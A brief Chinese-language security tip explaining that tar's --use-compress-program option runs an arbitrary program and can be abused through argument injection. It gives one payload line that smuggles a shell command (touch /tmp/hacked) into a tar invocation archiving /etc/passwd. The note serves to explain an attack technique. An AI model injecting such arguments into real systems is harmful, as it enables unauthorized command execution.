## -–use-compress-program参数

```
-I, --use-compress-program=PROG
                           filter through PROG (must accept -d)
```

tar命令的–use-compress-program参数选项可以执行shell命令，若存在参数注入则可利用。

payload示例如下：

```
tar --use-compress-program='touch /tmp/hacked' -cf /tmp/passwd /etc/passwd
```
